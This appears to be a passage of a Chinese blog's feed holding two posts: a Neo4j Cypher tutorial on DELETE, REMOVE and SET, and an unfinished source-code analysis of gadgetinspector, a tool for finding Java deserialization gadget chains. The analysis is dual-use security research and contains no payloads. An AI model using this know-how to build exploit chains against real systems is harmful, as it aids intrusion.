class="number">55000</span>&#125;]-&gt;(cc) </span><br><span class="line">RETURN r</span><br></pre></td></tr></table></figure><p>有必要补充一下，可以不使用WHERE达到<code>WHERE</code>的一些效果，比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH p=(m:Bot&#123;id:<span class="number">123</span>&#125;)&lt;-[:BotRelation]-&gt;(:Bot)  RETURN p</span><br></pre></td></tr></table></figure><h3 id="DELETE删除"><a href="#DELETE删除" class="headerlink" title="DELETE删除"></a>DELETE删除</h3><p>Neo4j使用CQL DELETE子句</p><ul><li>删除节点。</li><li>删除节点及相关节点和关系。</li></ul><p><strong>DELETE节点子句语法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE &lt;node-name-list&gt;</span><br></pre></td></tr></table></figure><p><strong>示例</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH (e: Employee) DELETE e</span><br></pre></td></tr></table></figure><p><strong>DELETE节点和关系子句语法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE &lt;node1-name&gt;,&lt;node2-name&gt;,&lt;relationship-name&gt;</span><br></pre></td></tr></table></figure><p><strong>示例</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MATCH (cc: CreditCard)-[rel]-(c:Customer) </span><br><span class="line">DELETE cc,c,rel</span><br></pre></td></tr></table></figure><h4 id="删除所有节点与关系——delete"><a href="#删除所有节点与关系——delete" class="headerlink" title="删除所有节点与关系——delete"></a>删除所有节点与关系——delete</h4><p>删除单个节点：<code>MATCH (n:Useless) DELETE n;</code><br>删除单个节点和连接它的关系：<code>MATCH (n { name: &#39;Andres&#39; })-[r]-() DELETE n, r</code><br>删除所有节点和关系：<code>MATCH (n) OPTIONAL MATCH (n)-[r]-() DELETE n,r</code></p><p>删除某一类关系：<code>match (n)-[r:created]-() DELETE r</code></p><h3 id="REMOVE删除"><a href="#REMOVE删除" class="headerlink" title="REMOVE删除"></a>REMOVE删除</h3><p>有时基于我们的客户端要求，我们需要向现有节点或关系添加或删除属性。</p><p>我们使用Neo4j CQL SET子句向现有节点或关系添加新属性。</p><p>我们使用Neo4j CQL REMOVE子句来删除节点或关系的现有属性。</p><p>Neo4j CQL REMOVE命令用于</p><ul><li>删除节点或关系的标签</li><li>删除节点或关系的属性</li></ul><p>Neo4j CQL DELETE和REMOVE命令之间的主要区别 -</p><ul><li>DELETE操作用于删除节点和关联关系。</li><li>REMOVE操作用于删除标签和属性。</li></ul><p>Neo4j CQL DELETE和REMOVE命令之间的相似性 -</p><ul><li>这两个命令不应单独使用。</li><li>两个命令都应该与MATCH命令一起使用。</li></ul><p><strong>1.REMOVE属性子句语法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REMOVE &lt;node-name&gt;.&lt;property1-name&gt;,&lt;node-name&gt;.&lt;property2-name&gt;</span><br></pre></td></tr></table></figure><p><strong>示例</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MATCH (dc:DebitCard) </span><br><span class="line">REMOVE dc.cvv</span><br><span class="line">RETURN dc</span><br></pre></td></tr></table></figure><p><strong>2.REMOVE一个Label子句语法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REMOVE &lt;label-name-list&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>S.No.</th><th>语法元素</th><th>描述</th></tr></thead><tbody><tr><td>1.</td><td>REMOVE</td><td>它是一个Neo4j CQL关键字。</td></tr><tr><td>2.</td><td></td><td>它是一个标签列表，用于永久性地从节点或关系中删除它。</td></tr></tbody></table><p>语法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;node-name&gt;:&lt;label2-name&gt;, </span><br><span class="line">.... </span><br><span class="line">&lt;node-name&gt;:&lt;labeln-name&gt; 复制代码</span><br></pre></td></tr></table></figure><h4 id="删除标签与属性——remove"><a href="#删除标签与属性——remove" class="headerlink" title="删除标签与属性——remove"></a>删除标签与属性——remove</h4><p>删除属性：<code>MATCH (andres { name: &#39;Andres&#39; }) REMOVE andres.age RETURN andres;</code><br>删除节点的标签：<code>MATCH (n { name: &#39;Peter&#39; }) REMOVE n:German RETURN n;</code><br>删除多重标签：<code>MATCH (n { name: &#39;Peter&#39; }) REMOVE n:German:Swedish RETURN n</code></p><h3 id="SET子句"><a href="#SET子句" class="headerlink" title="SET子句"></a>SET子句</h3><p>有时，根据我们的客户端要求，我们需要向现有节点或关系添加新属性。</p><p>要做到这一点，Neo4j CQL提供了一个SET子句。</p><p>Neo4j CQL已提供SET子句来执行以下操作。</p><ul><li>向现有节点或关系添加新属性</li><li>添加或更新属性值</li></ul><p><strong>SET子句语法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET  &lt;node-label-name&gt;.&lt;property1-name&gt;,...&lt;node-laben-name&gt;.&lt;propertyn-name&gt;复制代码</span><br></pre></td></tr></table></figure><p>语法说明：</p><table><thead><tr><th>S.No.</th><th>语法元素</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>&lt;节点标签名称&gt;</td><td>这是一个节点的标签名称。</td></tr><tr><td>2</td><td>&lt;属性名称&gt;</td><td>它是一个节点的属性名。</td></tr></tbody></table><p><strong>示例</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MATCH (dc:DebitCard)</span><br><span class="line">SET dc.atm_pin = <span class="number">3456</span></span><br><span class="line">RETURN dc</span><br></pre></td></tr></table></figure><h2 id="模式匹配"><a href="#模式匹配" class="headerlink" title="模式匹配"></a>模式匹配</h2><p>模式匹配是Cypher语句的重要部分</p><p><img src="../images/Neo4j%E7%88%AC%E5%9D%91%E8%AE%B0/image-20201218162301263.png" alt="image-20201218162301263"></p><p>当描述关系时，在方括号里面的冒号（：）后面指定关系的类型。当建立关系（句法上大小写敏感）时，类型必须与它定义的类型严格一致。这个简单的查询使用[：HAS_SEEN]句法描述了单个HAS_SEEN关系。</p><p>关系方向的描述是在Cypher中用ASCII实现的。关系的连接是用ASCII箭 头（单个连字符接着一个大于号或前面有一个小于号[]-&gt;或&lt;-[]）连接着它 的端点。关系的起点使用单个连字符连接（[]-）。在前面的例子中，匹配用户看过的电影（match（user）-[：HAS_SEEN]-&gt;（movie））模式指定了从user节点指向movie节点的HAS_SEEN关系。</p><p>在Cypher查询中，节点和关系都可以与标识关联，这种关联使得以后可以在同样的查询中引用同一个图形实体。下面的例子在返回语句中引用了 movie节点。</p><p><img src="../images/Neo4j%E7%88%AC%E5%9D%91%E8%AE%B0/image-20201218162951725.png" alt="image-20201218162951725"></p><h2 id="个人备忘"><a href="#个人备忘" class="headerlink" title="个人备忘"></a>个人备忘</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOAD CSV WITH HEADERS FROM "file:///Users/Desktop/workJava/ossez/classes.csv" as line</span><br><span class="line"><span class="selector-tag">MERGE</span> (<span class="selector-tag">n</span><span class="selector-pseudo">:node</span> &#123;<span class="attribute">classname</span>:line.ClassName&#125;) <span class="selector-tag">RETURN</span> <span class="selector-tag">n</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">MATCH</span> (<span class="selector-tag">n</span>)</span><br><span class="line"><span class="selector-tag">OPTIONAL</span> <span class="selector-tag">MATCH</span> (<span class="selector-tag">n</span>)<span class="selector-tag">-</span><span class="selector-attr">[r]</span><span class="selector-tag">-</span>()</span><br><span class="line"><span class="selector-tag">DELETE</span> <span class="selector-tag">n</span>,<span class="selector-tag">r</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">结点可以没有名字 但是label一定要有</span><br><span class="line"></span><br><span class="line">nodename：labelname</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">//4个人</span><br><span class="line">CREATE (t:person &#123;name:&quot;tom&quot;, age:35, address: &quot;beijing&quot;&#125;)</span><br><span class="line">CREATE (p:person &#123;name:&quot;peter&quot;, age:25, address: &quot;nanjing&quot;&#125;)</span><br><span class="line">CREATE (a:person &#123;name:&quot;alice&quot;, age:30, address: &quot;hebei&quot;&#125;)</span><br><span class="line">CREATE (d:person &#123;name:&quot;donny&quot;, age:23, address: &quot;hunan&quot;&#125;)</span><br><span class="line"></span><br><span class="line">//3个宠物</span><br><span class="line">CREATE (a:pet &#123;name:&quot;doga&quot;, age:23, address: &quot;hunan&quot;&#125;)</span><br><span class="line">CREATE (b:pet &#123;name:&quot;dogb&quot;, age:23, address: &quot;hunan&quot;&#125;)</span><br><span class="line">CREATE (c:pet &#123;name:&quot;dogc&quot;, age:23, address: &quot;hunan&quot;&#125;)</span><br><span class="line"></span><br><span class="line">//5部电影</span><br><span class="line">CREATE (h:movie &#123;name:&quot;hulk&quot;, date:2002, nation: &quot;usa&quot;&#125;)</span><br><span class="line">CREATE (ca:movie &#123;name:&quot;captainamerican&quot;, date:2008, nation: &quot;usa&quot;&#125;)</span><br><span class="line">CREATE (he:movie &#123;name:&quot;hawkeye&quot;, date:2010, nation: &quot;usa&quot;&#125;)</span><br><span class="line">CREATE (i:movie &#123;name:&quot;ironman&quot;, date:2011, nation: &quot;usa&quot;&#125;)</span><br><span class="line">CREATE (w:movie &#123;name:&quot;widow&quot;, date:2020, nation: &quot;usa&quot;&#125;)</span><br><span class="line"></span><br><span class="line">//创建关系</span><br><span class="line"></span><br><span class="line">MATCH (t:person),(a:pet)</span><br><span class="line">WHERE t.name = &quot;tom&quot; AND a.name = &quot;doga&quot;</span><br><span class="line">CREATE (t)-[f:feed]-&gt;(a) </span><br><span class="line"></span><br><span class="line">MATCH (t:person &#123;name:&quot;tom&quot;&#125;),(a:pet &#123;name:&quot;doga&quot;&#125;)</span><br><span class="line">CREATE (t)-[f:feed]-&gt;(a) </span><br><span class="line"></span><br><span class="line">MERGE (t:person &#123;name:&quot;tom&quot;&#125;)-[f:feed]-&gt;(a:pet &#123;name:&quot;doga&quot;&#125;)</span><br><span class="line"></span><br><span class="line">//查询属性里有date值为2002年的东西</span><br><span class="line">match(n) </span><br><span class="line">where n.date=2002 </span><br><span class="line">return n</span><br><span class="line"></span><br><span class="line">match(n&#123;date:2002&#125;) </span><br><span class="line">return n</span><br><span class="line"></span><br><span class="line">// Get some data</span><br><span class="line"></span><br><span class="line">MATCH (n1)-[r]-&gt;(n2) RETURN r, n1, n2 LIMIT 25</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//删除person结点</span><br><span class="line">match (n:person) delete n</span><br><span class="line"></span><br><span class="line">//只是删除feed关系  </span><br><span class="line">MATCH p=()-[f:feed]-&gt;() DELETE f</span><br><span class="line"></span><br><span class="line">match (n)-[f:feed]-()</span><br><span class="line">detach delete f</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;一点浩然气，千里快哉风。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;今天来记录自己Neo4j实战、爬坑记录。&lt;/p&gt;
    
    </summary>
    
    
      <category term="图数据库" scheme="https://0range228.github.io/categories/%E5%9B%BE%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="Neo4j" scheme="https://0range228.github.io/tags/Neo4j/"/>
    
  </entry>
  
  <entry>
    <title>GadgetInspector源码分析</title>
    <link href="https://0range228.github.io/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>https://0range228.github.io/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-11-13T09:05:55.000Z</published>
    <updated>2021-04-23T05:51:14.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>好风凭借力，送我上青云。</p></blockquote><p>今天来分析<a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">gadgetinspector</a>源码。</p><a id="more"></a><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="https://www.youtube.com/watch?v=wPbW6zQ52w8" target="_blank" rel="noopener">Ian Haken</a>于2018年第26届DEFCON提出来的工具，主要是用来找出jar包内部的调用链。</p><p>这个工具有些地方很值得学习，总结一下。</p><p><a href="https://paper.seebug.org/1034/" target="_blank" rel="noopener">关于这个工具</a>：</p><ul><li>这个工具不是用来寻找漏洞，而是利用已知的source-&gt;…-&gt;sink链或其相似特征发现分支利用链或新的利用链。</li><li>这个工具是在整个应用的classpath中寻找利用链。</li><li>这个工具进行了一些合理的预估风险判断（污点判断、污点传递等）。</li><li>这个工具会产生误报不是漏报（其实这里还是会漏报，这是作者使用的策略决定的，在后面的分析中可以看到）。</li><li>这个工具是基于字节码分析的，对于Java应用来说，很多时候我们并没有源码，而只有War包、Jar包或class文件。</li><li>这个工具不会生成能直接利用的Payload，<strong>具体的利用构造还需要人工参与</strong>。</li></ul><p>在分析gadgetinspector源码的时候，大概会在以下几<a href="https://xz.aliyun.com/t/7058" target="_blank" rel="noopener">方面</a>去讲解，并核心分析ASM部分，详细讲解如何进行污点分析：</p><ol><li>GadgetInspector：main方法，程序的入口，做一些配置以及数据的准备工作</li><li>MethodDiscovery：类、方法数据以及父子类、超类关系数据的搜索</li><li>PassthroughDiscovery：分析参数能影响到返回值的方法，并收集存储</li><li>CallGraphDiscovery：记录调用者caller方法和被调用者target方法的参数关联</li><li>SourceDiscovery：入口方法的搜索，只有具备某种特征的入口才会被标记收集</li><li>GadgetChainDiscovery：整合以上数据，并通过判断调用链的最末端slink特征，从而判断出可利用的gadget chain</li></ol><h1 id="流程介绍"><a href="#流程介绍" class="headerlink" title="流程介绍"></a>流程介绍</h1><p>先写在这里：</p><p>ASM的方法描述符：</p><p>方法描述符使用小括号开始，小括号内部是方法入参的类型描述符按照顺序拼接的字符串，在加上返回值的类型描述符组成，返回值是void的时候，使用<strong>V</strong>。方法的描述符不包含方法名和参数名。</p><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p><em>加载jar包内部类</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//初始化jar包，获得一个类加载器，该类加载器已经将其加载</span></span><br><span class="line">ClassLoader classLoader = initJar(args);</span><br></pre></td></tr></table></figure><p>跟进<em>initJar</em>函数：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117095645316.png" alt="image-20201117095645316"></p><p>可以看到<em>initJar</em>将启动参数参数内的jar都保存到path里面，然后继续调用<em>getJarClassLoader</em>函数：</p><p><em>getJarClassLoader:</em></p><ul><li><p>在项目路径下，创建临时文件夹exploded-jar，在jvm shutdown自动删除；</p></li><li><p>接着将jar包内容提取到临时文件夹内部，这里面会有</p></li></ul><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117102333361.png" alt="image-20201117102333361"></p><ul><li>接着使用URLClassLoader将jarpath加载到类加载器，并返回这个类加载器；</li></ul><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117102613592.png" alt="image-20201117102613592"></p><h2 id="包装类加载器"><a href="#包装类加载器" class="headerlink" title="包装类加载器"></a>包装类加载器</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取类加载器</span></span><br><span class="line"><span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator = <span class="keyword">new</span> ClassResourceEnumerator(classLoader);</span><br></pre></td></tr></table></figure><p>这里就是将上一步加载我们jar的类加载器classLoader传入ClassResourceEnumerator。</p><p>跟进ClassResourceEnumerator：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117104353938.png" alt="image-20201117104353938"></p><p>最关键的是这两个函数，分析一下：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117104440730.png" alt="image-20201117104440730"></p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117104455288.png" alt="image-20201117104455288"></p><p>可以看到<em>getAllClasses()</em>函数首先调用<em>getRuntimeClasses()</em>函数，那么跟进<em>getRuntimeClasses()</em>仔细看：</p><p>目的是将rt.jar加载到这里作者注释也写到他用了一个<strong>比较hacky</strong>的方式：</p><p>他先获取JDK内部的String类的路径，加载String类的同时，类加载器还会将rt.jar的全部类一起加载，那么最后就是将rt.jar的所有类都加入到ClassResource类型的result并且返回。</p><p>其实就是获取rt.jar的所有class。</p><p>回到<em>getAllClasses()</em>函数，其实拿到rt.jar之后，继续将传入的jar包内的类加入到result，并最后返回。</p><p>总结：</p><ul><li><code>getRuntimeClasses</code>获取rt.jar的所有class</li><li><code>getAllClasses</code>获取rt.jar以及classLoader加载的class</li></ul><h2 id="方法探索-MethodDiscovery"><a href="#方法探索-MethodDiscovery" class="headerlink" title="方法探索 MethodDiscovery"></a>方法探索 MethodDiscovery</h2><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117111114802.png" alt="image-20201117111114802"></p><h3 id="discover"><a href="#discover" class="headerlink" title="discover()"></a>discover()</h3><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117111206892.png" alt="image-20201117111206892"></p><p>该函数接收一个ClassResourceEnumerator类型的参数，这个参数主要将之前的类加载器(rt全部类+分析类)都包装并且传入。</p><p>获取每一个class类对象之后，进行ASM分析环节。</p><p>首先，看到在<code>discover</code>方法中获取了所有的类，并通过<code>MethodDiscoveryClassVisitor</code>去记录类和类方法信息。</p><p>跟进<code>MethodDiscoveryClassVisitor</code>去看看：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117115215131.png" alt="image-20201117115215131"></p><p>这里其实会将我们所有类内部的元素进行存储，例如类名、父类名、接口、是否为接口、类的全部字段、classHandle把位。</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117115411195.png" alt="image-20201117115411195"></p><p>在ASM里，visit和visitEnd方法是一定会调用的，其他会按顺序来调用，那么这里就是：</p><ol><li>visit                  访问类的头部</li><li>visitField          访问类属性</li><li>visitMethod    访问类方法</li><li>visitEnd</li></ol><h3 id="save"><a href="#save" class="headerlink" title="save()"></a>save()</h3><p>saveData方法中会通过调用factory的serialize对数据进行序列化，然后一行一行的输出</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117144908462.png" alt="image-20201117144908462"></p><p>这里重点看<em>derive</em>函数：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117160457359.png" alt="image-20201117160457359"></p><p>这里说一下最后的翻转，跟进去：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117165701353.png" alt="image-20201117165701353"></p><p>最后的save函数，保存格式为子类：父类：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117165758797.png" alt="image-20201117165758797"></p><p>这里说一下InheritanceMap是一个类，有两个fields：</p><ol><li>inheritanceMap 存放是子-&gt;父集合</li><li>subClassMap存放的是父-&gt;子集合</li></ol><h2 id="流程图探索-PassthroughDiscovery"><a href="#流程图探索-PassthroughDiscovery" class="headerlink" title="流程图探索 PassthroughDiscovery"></a>流程图探索 PassthroughDiscovery</h2><p>在这环节中，需要将上一环节的成果也就是classes.dat，methods.dat和inheritanceMap.dat都利用起来。</p><p>这里的passthrough数据流指的是<strong>每个方法的返回结果</strong>与<strong>方法参数</strong>的关系，这一步生成的数据会在生成passthrough调用图时用到。</p><p>主要用以发现<strong>函数返回值</strong>与<strong>传进来参数之间</strong>的<strong>污点关系</strong>，工作量最大的一个部分。</p><p>参考<a href="https://paper.seebug.org/1034/#step2-passthrough" target="_blank" rel="noopener">seebug</a>，先看作者的一个demo：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20210316110702699.png" alt="image-20210316110702699"></p><p>成员/this，都是0；参数为1；</p><p>FnConstant.invoke返回值与参数this(参数0，因为序列化时类的所有成员我们都能控制，<strong>所以所有成员变量都视为0参</strong>)、arg(参数1)的关系：</p><ul><li>与this的关系：返回了this.value，即与0参有关系</li><li>与arg的关系：返回值与arg没有任何关系，即与1参没有关系</li><li>结论就是FnConstant.invoke与参数0有关，表示为FnConstant.invoke()-&gt;0</li></ul><p>Fndefault.invoke返回值与参数this(参数0)、arg(参数1)的关系：</p><ul><li>与this的关系：返回条件的第二个分支与this.f有关系，即与0参有关系</li><li>与arg的关系：返回条件的第一个分支与arg有关系，即与1参有关系</li><li>结论就是FnConstant.invoke与0参，1参都有关系，表示为Fndefault.invoke()-&gt;0、Fndefault.invoke()-&gt;1</li></ul><p>回到gi，gadgetinspector是利用ASM来进行方法字节码的分析，主要逻辑是在类PassthroughDiscovery和TaintTrackingMethodVisitor中。特别是TaintTrackingMethodVisitor，它通过==标记追踪JVM虚拟机在执行方法时的stack和localvar==，并最终得到返回结果是否可以被参数标记污染。</p><p>不仅仅是信息搜集，还要做污点的信息判断，以及方法间的变量关联。</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117170319531.png" alt="image-20201117170319531"></p><h3 id="discover-1"><a href="#discover-1" class="headerlink" title="discover()"></a>discover()</h3><p>这段很复杂 写个调用顺序在这：</p><p>discoverMethodCalls-&gt;MethodCallDiscoveryClassVisitor-&gt;MethodCallDiscoveryMethodVisitor-&gt;更新calledMethods和methodCalls集合;</p><p>topologicallySortMethodCalls-&gt;获得sortedMethods集合，存放着方法调用链逆拓扑结果</p><p>calculatePassthroughDataflow-&gt;PassthroughDataflowClassVisitor-&gt;PassthroughDataflowMethodVisitor</p><p>跟进discover方法，可以看到首先对之前的结果进行了加载：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117204635986.png" alt="image-20201117204635986"></p><p>跟进<em>discoverMethodCalls</em>函数：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117204716978.png" alt="image-20201117204716978"></p><p>可以看到又按照访问者模式，进行了ASM分析，跟进<em>MethodCallDiscoveryClassVisitor</em> :</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117205029118.png" alt="image-20201117205029118"></p><p>可以看到内部重写了下面的方法，并且会按照顺序进行执行：</p><ul><li>visit：把当前观察的类名赋值到了this.name</li><li>visitMethod：继续进一步的对被观察类的每一个方法细节进行观察，传入了当前观察的类名和方法名</li><li>visitEnd：除了super，啥也没干</li></ul><p>看到在visitMethod时候，进行了<em>MethodCallDiscoveryMethodVisitor</em>，跟进看看：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201117205544372.png" alt="image-20201117205544372"></p><p><em>MethodCallDiscoveryMethodVisitor</em>继承了ASM的MethodVisitor的构造函数，</p><p>在MethodCallDiscoveryMethodVisitor构造方法执行的时候，会对this.calledMethods集合进行初始化，该集合的主要作用是在被观察方法对其他方法进行调用时（会执行visitMethodInsn方法），用于缓存记录被调用的方法，因此，我们可以看到visitMethodInsn方法中：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201119092039034.png" alt="image-20201119092039034"></p><p>理解：calledMethods存放的是被调用的方法，ASM对于正在visit的方法，在visit的时候，如果在方法内出现了调用其他方法的行为，那么就会执行visitMethodInsn方法，它会将被调用的方法记录在calledMethods这个hashset集合内。</p><p>并且在构造方法执行的时候，集合calledMethods也会被添加到gadgetinspector.PassthroughDiscovery#methodCalls中，做全局性的收集，因此，最后我们能通过discoverMethodCalls这一个方法，实现对这样一个数据的全量收集：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201119093509631.png" alt="image-20201119093509631"></p><p>接下来调用<em>topologicallySortMethodCalls</em>，</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201119093735153.png" alt="image-20201119093735153"></p><p>跟进去：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201119095514058.png" alt="image-20201119095514058"></p><p>这里就开始了重头戏，DFS+逆拓扑。</p><p>这里重点参考<a href="https://paper.seebug.org/1034/" target="_blank" rel="noopener">404</a>的这篇文章，原理讲得很清楚。</p><p>在开始逆拓扑之前，可以看到作者首先准备了三个数据结构：</p><ul><li>dfsStack：栈，用来分析方法调用顺序，也用于在在逆拓扑时候不会形成环</li><li>visitedNodes：访问过的结点，在一条调用链出现重合的时候，不会造成重复的排序</li><li>sortedMethods：最终逆拓扑排序出来的结果集合</li></ul><p>跟进dfsTsort：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201120092931396.png" alt="image-20201120092931396"></p><p>dfsTsort是一个迭代函数：</p><p>判断条件：</p><ol><li>对于待分析的方法，如果stack里面已经有了，那就不再入栈了</li><li>如果之前已经分析过某方法（visitedNodes已经存在），那么也不会再入栈了</li></ol><p>接下来，将待分析方法所调用的所有方法集合都取出来，这里可以说是子方法集合outgoingReferences。</p><p>之后开始遍历子方法集合，取出每一个子方法作为参数，开始迭代</p><p>这其实就是DFS，当到达一个叶子结点的时候，由于没有子方法，就不会进入到循环，也就不会再次递归。</p><p>这时就会弹出栈顶元素，也就是叶子结点，加入到visitedNodes和sortedMethods里面。</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201120100545146.png" alt="image-20201120100545146"></p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201120100601500.png" alt="image-20201120100601500"></p><h3 id="生成passthrough数据流图"><a href="#生成passthrough数据流图" class="headerlink" title="生成passthrough数据流图"></a>生成passthrough数据流图</h3><p>在calculatePassthroughDataflow中遍历了sortedmethods，并通过字节码分析，生成了方法返回值与参数关系的passthrough数据流。注意到下面的序列化决定器，作者内置了三种：JDK、Jackson、Xstream，会根据具体的序列化决定器判定决策过程中的类是否符合对应库的反序列化要求，不符合的就跳过：</p><ul><li>对于JDK(ObjectInputStream)，类否继承了Serializable接口</li><li>对于Jackson，类是否存在0参构造器</li><li>对于Xstream，类名能否作为有效的XML标签</li></ul><p>生成passthrough数据流代码：</p><p><img src="../images/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20201120104511218.png" alt="image-20201120104511218"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow = <span class="keyword">new</span> 